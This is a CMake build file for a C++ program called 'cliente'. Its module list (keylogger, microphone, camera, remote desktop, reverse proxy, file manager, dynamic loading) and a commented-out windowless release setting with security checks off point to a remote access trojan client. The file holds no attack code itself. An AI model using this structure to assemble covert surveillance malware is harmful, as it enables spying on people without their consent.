cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)
 
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
#set(CMAKE_CXX_EXTENSIONS OFF)

#foreach(flag_var
#    CMAKE_C_FLAGS
#    CMAKE_C_FLAGS_DEBUG
#    CMAKE_C_FLAGS_RELEASE
#    CMAKE_C_FLAGS_RELWITHDEBINFO
#    CMAKE_C_FLAGS_MINSIZEREL
#    CMAKE_CXX_FLAGS
#    CMAKE_CXX_FLAGS_DEBUG
#    CMAKE_CXX_FLAGS_RELEASE
#    CMAKE_CXX_FLAGS_RELWITHDEBINFO
#    CMAKE_CXX_FLAGS_MINSIZEREL
#)
#Debug con consola, /MDd o /MTd, símbolos, sin optimizar
#Release sin consola, /MT, optimizado, sin dependencias

#    if(${flag_var} MATCHES "/MD")
#        string(REPLACE "/MD" "/MT" ${flag_var} "${${flag_var}}")
#    elseif(${flag_var} MATCHES "/MDd")
#        string(REPLACE "/MDd" "/MTd" ${flag_var} "${${flag_var}}")
#    endif()
#endforeach()

#Debug
#set(CMAKE_EXE_LINKER_FLAGS_DEBUG "/SUBSYSTEM:CONSOLE")
#set(CMAKE_CXX_FLAGS_DEBUG "/Zi /Od /RTC1")

#Release
#set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/SUBSYSTEM:WINDOWS /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO")

#set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /O2 /GS- /GL /DNDEBUG /EHsc- /GR-")

set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_reverse_proxy.cpp
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_mic.cpp
         mod_remote_desktop.cpp
         mod_ventanas.cpp
         mod_info.cpp
         mod_escaner.cpp
         mod_fun.cpp
         mod_dynamic_load.cpp
         ../base64/base64.cpp
         ../sqlite3/sqlite3.c
         ../aes256/aes256.cpp
)


add_executable(cliente ${SRCS})

target_link_libraries(cliente PRIVATE mfuuid)

#Compilar con opciones para modularidad
#option(WITH_MOD1 "Enable modulo1" ON)
#if(WITH_MOD1)
#    target_compile_definitions(cliente PRIVATE WITH_MOD1)
#endif()